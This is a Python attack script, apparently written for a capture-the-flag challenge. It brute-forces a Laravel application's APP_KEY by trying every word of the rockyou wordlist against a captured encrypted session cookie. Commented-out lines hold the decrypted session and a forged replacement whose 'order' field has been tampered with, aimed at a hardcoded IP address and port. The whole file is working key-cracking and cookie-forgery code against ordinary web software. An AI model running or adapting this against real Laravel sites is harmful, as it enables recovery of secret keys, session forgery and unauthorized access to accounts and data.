import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        #return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ''


def encrypt(string):
    global key
    iv = os.urandom(16)
    #string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, 'utf-8')
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

def wordlist_decrypt():
    global key
    filename = '/home/user/wordlists/rockyou.txt'
    with open(filename, 'r', errors='ignore') as file:
        for word in file.readlines():
            word = word.strip().encode('utf-8')
            word_b64 = base64.b64encode(word).decode('utf-8')
            word = word.decode('utf-8')
            print(f'trying {word}:{word_b64} ...')
            app_key = word_b64
            key = base64.b64decode(app_key)
            cookie = 'eyJpdiI6ImJ3TzlNRjV6bXFyVjJTdWZhK3JRZ1E9PSIsInZhbHVlIjoiQ3kxVDIwWkRFOE1sXC9iUUxjQ2IxSGx1V3MwS1BBXC9KUUVrTklReit0V2k3TkMxWXZJUE02cFZEeERLQU1PV1gxVForYkd1dWNhY3lpb2Nmb0J6YlNZR28rVmk1QUVJS3YwS3doTXVHSlhcL1JGY0t6YzhaaGNHR1duSktIdjF1elwvNXhrd1Q4SVlXMzBrbTV0MWk5MXFkSmQrMDJMK2F4cFRkV0xlQ0REVU1RTW5TNVMrNXRybW9rdFB4VitTcGQ0QlVlR3Vwam1IdERmaDRiMjBQS05VXC90SzhDMUVLbjdmdkUyMnQyUGtadDJHSEIyQm95SVQxQzdWXC9JNWZKXC9VZHI4Sll4Y3ErVjdLbXplTW4yK25pTGxMUEtpZVRIR090RlF0SHVkM0VaWU8yODhtaTRXcVErdUlhYzh4OXNacXJrVytqd1hjQ3FMaDhWeG5NMXFxVXB1b2V2QVFIeFwvakRsd1pUY0h6UUR6Q0UrcktDa3lFOENIeFR0bXIrbWxOM1FJaVpsTWZkSCtFcmd3aXVMZVRKYXl0RXN3cG5EMitnanJyV0xkU0E3SEUrbU0rUjlENU9YMFE0eTRhUzAyeEJwUTFsU1JvQ3d3UnIyaEJiOHA1Wmw1dz09IiwibWFjIjoiNmMzODEzZTk4MGRhZWVhMmFhMDI4MWQzMmRkNjgwNTVkMzUxMmY1NGVmZWUzOWU4ZTJhNjBiMGI5Mjg2NzVlNSJ9'
            d = decrypt(cookie)
            if d:
                print('GOT IT!!! ???')
                print(d)
                exit()
            #b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"vYzY0IdalD2ZC7v9yopWlnnYnCB2NkCXPbzfQ3MV\\";s:8:\\"username\\";s:8:\\"guestc32\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605140631}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'
            #encrypt(b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"RYB6adMfWWTSNXaDfEw74ADcfMGIFC2SwepVOiUw\\";s:8:\\"username\\";s:8:\\"guest60e\\";s:5:\\"order\\";s:8:\\"lolololo\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605141157}')

wordlist_decrypt()